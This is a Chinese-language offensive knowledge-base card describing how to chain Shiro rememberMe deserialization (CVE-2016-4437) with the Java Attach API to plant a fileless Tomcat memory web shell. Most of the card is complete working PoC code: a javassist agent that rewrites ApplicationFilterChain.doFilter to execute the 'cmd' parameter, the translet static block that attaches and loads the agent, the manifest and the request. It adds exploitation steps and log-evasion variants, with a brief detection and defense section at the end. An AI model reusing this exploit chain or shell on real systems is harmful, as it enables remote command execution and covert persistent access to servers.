---
id: web-java-classloader-deser-attach-agent-filterchain-memshell
title: 反序列化链驱动 Attach API 装载 Agent：改写 ApplicationFilterChain.doFilter 植入 cmd Filter 内存马
type: scenario
domain: web
path: web/java/classloader
technique: deserialization-bootstrap-attach-agent-filterchain-memshell
aliases:
- Shiro 反序列化打 Agent 内存马
- AgentMain 注入 FilterChain
- ApplicationFilterChain doFilter 内存马
- TemplatesImpl 触发 Attach API 注入
- 反序列化 + Java Agent 内存马
tags:
- java
- jvm
- instrumentation
- agentmain
- attach-api
- retransform
- javassist
- memory-shell
- tomcat
- filter
- deserialization
- templatesimpl
- shiro
cve:
- CVE-2016-4437
severity: critical
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W1
  verified_at: '2026-11-08T11:45:43+08:00'
  notes: 已对照原文核对：Shiro rememberMe 默认密钥 AES-CBC 打 CommonsBeanutils1/TemplatesImpl、translet 静态块反射 URLClassLoader.addURL 补 tools.jar、VirtualMachine.list 过滤 Bootstrap 后 attach/loadAgent/detach、Agent 侧 addTransformer(true)+retransformClasses 改写 ApplicationFilterChain.doFilter 插入读 cmd 参数执行并写响应，均与本篇原文一致；CVE-2016-4437 与 Shiro-550 默认密钥场景对得上。已把原文未给截图的 uid=0(root) 回显标注为「示例值」而非实测，并把 loadAgent 的 agent jar 路径明确为目标机绝对路径。未验证点：原文只演示到注入与页面访问，未给出命令回显截图，本核对未复跑。
---

## 一句话结论

当目标只给了一个反序列化入口（如 Shiro rememberMe 默认密钥）而没有命令回显时，可在反序列化载荷里放一个只做「加载 tools.jar + 反射调用 `VirtualMachine.attach/loadAgent`」的 `TemplatesImpl` translet，把 Attach 侧的 Agentjar 装进同机 Tomcat 的 JVM；Agent 的 `agentmain` 再通过 `Instrumentation.retransformClasses()` 用 javassist 改写 `org.apache.catalina.core.ApplicationFilterChain.doFilter`，插入读 `cmd` 参数执行命令并直接写响应的代码，最终得到一个不落盘、不依赖框架路由的 Filter 链内存马。

## 原理

- **两次跳板**：反序列化只能执行「一段在目标 JVM 内的 Java 代码」，而该代码本身没有 Attach 能力（Attach 依赖 `com.sun.tools.attach`，位于 `jdk/lib/tools.jar`，默认不在应用 classpath）。因此第一跳是把 `tools.jar` 用反射 `URLClassLoader.addURL` 加进 system classloader，再反射 `VirtualMachine.list()` 找到 `displayName` 含 `org.apache.catalina.startup.Bootstrap` 的进程，`attach(pid)` 后 `loadAgent(path)`；第二跳才是真正干活的 Agent，它在独立 jar 里，`agentmain(String, Instrumentation)` 被 JVM 调用时可自由使用 `Instrumentation` 与 javassist。
- **选 doFilter 作为 Hook 点的原因**：`ApplicationFilterChain.doFilter(ServletRequest, ServletResponse)` 是 Tomcat 处理每个请求必经的过滤器链入口，与具体 Servlet 路由无关，并且它从 `request`/`response` 字段（javassist 中以局部变量名直接引用）取到当前请求对象；所以在该方法 `insertBefore` 之后，任意 URL、任意 HTTP 方法都会执行注入代码，不存在「只对某个 Controller 生效」的限制。
- **改写为何可行**：`Instrumentation.addTransformer(transformer, true)` 注册的是可重转换 Transformer；`retransformClasses(ApplicationFilterChain.class)` 让 JVM 用原始字节码重新调用 Transformer，Transformer 返回 javassist 修改后的 `toBytecode()`，JVM 校验通过后替换内存中的类定义。类已加载也能改，所以不需要重启、不需要 `-javaagent` 启动参数。
- **命令出口**：插入的代码读 `req.getParameter("cmd")`，命中则 `Runtime.getRuntime().exec(cmd)`，把 `Process` 的 stdout 收进 `StringBuilder`，写到 `res.getOutputStream()` 并 flush/close。因为代码在过滤器链最前面，业务逻辑被跳过，响应里只有命令输出。
- **Agent 下发方式**：`loadAgent(agentPath)` 要求 agent jar 在目标 JVM 可读的路径上（本例是由攻击者先上传/落地的 `AgentmainDemo.jar`，或通过 `file://` 可访问位置）。`MANIFEST.MF` 必须声明 `Agent-Class`、`Can-Retransform-Classes: true`、`Can-Redefine-Classes: true`，否则 `retransformClasses` 抛 `UnsupportedOperationException`。

## 触发条件

- 目标存在可用的 Java 反序列化 gadget（原文用 Shiro rememberMe 默认密钥 + CommonsBeanutils1/TemplatesImpl，等价场景是任何能走到 `TemplatesImpl.newTransformer()` 的链）。
- 攻击者的 translet 代码能在目标 JVM 中反射获得 `URLClassLoader`，并成功把 `tools.jar` 加入 classpath；JDK 8 的 `java.home` 下存在 `lib/tools.jar`（JDK 9+ 无此文件，该写法失效）。
- 目标 JVM 进程与执行反序列化的进程是同一个（Web 容器即 Tomcat），`VirtualMachine.list()` 能看到 `org.apache.catalina.startup.Bootstrap`；`loadAgent(path)` 里的 path 必须是**目标机**上可读的绝对路径（原文用的是一个绝对 jar 路径），所以跨机场景要先解决 agent jar 落地。
- Agent jar 已被写到目标可读路径（如上传到 web 目录或临时目录）。
- Attach 未被禁用（未设 `-XX:+DisableAttachMechanism`），目标进程用户与执行 Attach 的用户一致。
- `ApplicationFilterChain` 已被加载且 `isModifiableClass` 为真；开启了安全管理器或 RASP 拦截 `retransformClasses` 时会失败。

## 利用步骤

1. 先只用 `CommonsBeanutils1` + `touch /tmp/success` 验证反序列化入口确实可执行，避免把 gadget 问题误判为 Agent 问题。
2. 准备 Agent jar：`agentmain` 里 `addTransformer(new MyTransformer(), true)`，再遍历 `getAllLoadedClasses()` 匹配 `org.apache.catalina.core.ApplicationFilterChain`，命中后 `retransformClasses`；`MyTransformer` 用 javassist 对该类 `doFilter` 方法 `insertBefore(命令执行代码)`。`MANIFEST.MF` 写 `Agent-Class: MyAgent` 与两个 `Can-*` 开关，jar 内需包含 javassist 与所需依赖。
3. 把 jar 传到目标主机可读路径（例如 web 可写目录或 `/tmp`），记录绝对路径。
4. 准备第一跳 translet：`TemplatesImpl` 的 `_bytecodes` 指向一个 `AbstractTranslet` 子类，其静态初始化块里用反射把 `tools.jar` 加入 `URLClassLoader`，`VirtualMachine.list()` 过滤 `Bootstrap`，`attach` → `loadAgent(jar 路径)` → `detach`。
5. 用 ysoserial 改造出整条链（`TemplatesImpl` + `LazyMap`/`TiedMapEntry` + `HashSet` 触发 `newTransformer`），按 Shiro-550 格式以默认密钥 AES-CBC 加密并 Base64，替换 `rememberMe` Cookie。
6. 发送请求验证反序列化执行；随后访问任意路径 `?cmd=id`，确认 `doFilter` 已被改写并回显命令结果。
7. 若注入失败，检查目标日志中 translet 静态块 `catch` 到的异常：`tools.jar` 不存在、`AgentInitializationException`（manifest 缺字段）、`AgentLoadException`（路径不可读）分别是三类典型原因。

## PoC

Agent 侧（第二跳）：

```java
import java.lang.instrument.Instrumentation;

public class MyAgent {
    public static void agentmain(String args, Instrumentation inst) throws Exception {
        inst.addTransformer(new MyTransformer(), true);
        for (Class<?> c : inst.getAllLoadedClasses()) {
            if (c.getName().equals("org.apache.catalina.core.ApplicationFilterChain")) {
                inst.retransformClasses(c);
            }
        }
    }
}
```

```java
import javassist.*;
import java.lang.instrument.ClassFileTransformer;
import java.security.ProtectionDomain;

public class MyTransformer implements ClassFileTransformer {
    public byte[] transform(ClassLoader loader, String className, Class<?> cls,
                            ProtectionDomain pd, byte[] buf) {
        if (!"org.apache.catalina.core.ApplicationFilterChain".equals(className.replace('/', '.'))) return null;
        try {
            ClassPool cp = ClassPool.getDefault();
            if (cls != null) cp.insertClassPath(new ClassClassPath(cls));
            CtClass cc = cp.get("org.apache.catalina.core.ApplicationFilterChain");
            CtMethod m = cc.getDeclaredMethod("doFilter");
            m.insertBefore(
                "javax.servlet.ServletRequest _r = request;" +
                "javax.servlet.ServletResponse _s = response;" +
                "String _cmd = _r.getParameter(\"cmd\");" +
                "if (_cmd != null) {" +
                "  Process _p = Runtime.getRuntime().exec(_cmd);" +
                "  java.io.BufferedReader _br = new java.io.BufferedReader(new java.io.InputStreamReader(_p.getInputStream()));" +
                "  StringBuilder _sb = new StringBuilder(); String _l;" +
                "  while ((_l = _br.readLine()) != null) _sb.append(_l + '\\n');" +
                "  _s.getOutputStream().write(_sb.toString().getBytes());" +
                "  _s.getOutputStream().flush(); _s.getOutputStream().close();" +
                "}");
            byte[] out = cc.toBytecode();
            cc.detach();
            return out;
        } catch (Exception e) { return null; }
    }
}
```

```text
MANIFEST.MF
Manifest-Version: 1.0
Can-Redefine-Classes: true
Can-Retransform-Classes: true
Agent-Class: MyAgent
```

反序列化侧（第一跳，translet 静态块核心）：

```java
static {
    try {
        java.io.File tools = new java.io.File(
            System.getProperty("java.home").replaceFirst("jre", "lib") + java.io.File.separator + "tools.jar");
        java.net.URLClassLoader cl = (java.net.URLClassLoader) ClassLoader.getSystemClassLoader();
        java.lang.reflect.Method add = java.net.URLClassLoader.class.getDeclaredMethod("addURL", java.net.URL.class);
        add.setAccessible(true);
        add.invoke(cl, tools.toURI().toURL());

        Class<?> VM = cl.loadClass("com.sun.tools.attach.VirtualMachine");
        java.lang.reflect.Method list = VM.getDeclaredMethod("list", null);
        java.util.List<?> vms = (java.util.List<?>) list.invoke(null, null);
        for (Object o : vms) {
            java.lang.reflect.Method dn = o.getClass().getSuperclass().getDeclaredMethod("displayName", null);
            String name = (String) dn.invoke(o, null);
            if (name.contains("org.apache.catalina.startup.Bootstrap")) {
                java.lang.reflect.Method attach = VM.getDeclaredMethod("attach", VM.list().get(0).getClass());
                Object machine = attach.invoke(VM, o);
                java.lang.reflect.Method load = machine.getClass()
                    .getSuperclass().getSuperclass().getDeclaredMethod("loadAgent", String.class);
                load.invoke(machine, new Object[]{"/tmp/agent.jar"});
                machine.getClass().getSuperclass().getSuperclass()
                    .getDeclaredMethod("detach", null).invoke(machine, null);
                break;
            }
        }
    } catch (Exception e) { e.printStackTrace(); }
}
```

请求侧：

```http
GET /?cmd=id HTTP/1.1
Host: target:8080
Cookie: rememberMe=<TemplatesImpl 链的 AES+Base64 载荷>
```

命中后的输出形如（示例值，以目标实际身份为准）：

```text
uid=0(root) gid=0(root) groups=0(root)
```

## 变体与关联

- **Hook 点变体**：`HttpServlet.service`、`RequestDispatcher`、Tomcat `Valve`、Spring `DispatcherServlet.doDispatch` 均可；`ApplicationFilterChain.doFilter` 的优点是覆盖全部过滤器前后请求且不依赖框架层。
- **命令通道变体**：用请求头（如 `X-Token`）取命令避开参数日志；用 `ProcessBuilder` 支持重定向与管道；将输出写到自定义响应头避开日志采集。
- **下发方式变体**：若目标不方便落盘 agent jar，可改用「内存中定义 Agent 类并通过临时 jar 释放」或改用其他 Attach 实现；jar 也可放在 Spring Boot fat jar 可访问的路径。
- **关联**：[[web-java-classloader-attach-api-jvmti-agent-memory-shell]] 讲纯主机 Shell 场景下直接 `VirtualMachine.attach` 改写 `HttpServlet.service`；本卡的差异是入口为**反序列化**而非主机 Shell，且需先用 `tools.jar` + `URLClassLoader.addURL` 反射补 classpath，Hook 点选 `ApplicationFilterChain.doFilter`。[[web-java-framework-shiro-rememberme-two-stage-memshell-loader]] 是同一入口下「Cookie 8KB 限制」的两段式类加载方案，与本卡的 Attach 方案是并列的两种落地手段。[[web-java-classloader-shiro-rememberme-spring-interceptor-memshell-classdata]] 则走 Spring 拦截器路线。
- **边界**：JDK 9+ 无 `tools.jar`，第一跳需换 `jdk.attach` 模块反射或直接调用 `com.sun.tools.attach.VirtualMachine`（模块已默认可用）；JDK 21 起默认禁止动态加载 Agent，需要 `-XX:+EnableDynamicAgentLoading`。

## 检测与防御

- 检测：进程出现 `Attach Listener` 线程（`jcmd <pid> Thread.print`）、`/tmp/.attach_pid*` 与 `.java_pid*` 文件、`loadAgent` 后的 agent jar 路径；对 `ApplicationFilterChain` 等核心类做字节码基线比对，异常时其方法长度会显著变化。
- 检测：Shiro rememberMe 中的超长 Base64、`TemplatesImpl`/`TiedMapEntry` 类名特征；translet 反编译可见 `com.sun.tools.attach` 与 `tools.jar` 字符串。
- 防御：`-XX:+DisableAttachMechanism` 关闭 Attach；升级/轮换 Shiro 密钥并对反序列化入口加类白名单（JEP 290 `ObjectInputFilter`）；限制应用进程对 `lib/tools.jar` 的读取与 tmp 目录写权限；部署 RASP 保护 Transformer 链并告警 `retransformClasses`。
- 收敛：容器内以非 root、独立用户运行，systemd `PrivateTmp=true` 隔离 `/tmp`，使 Attach 文件不可达。
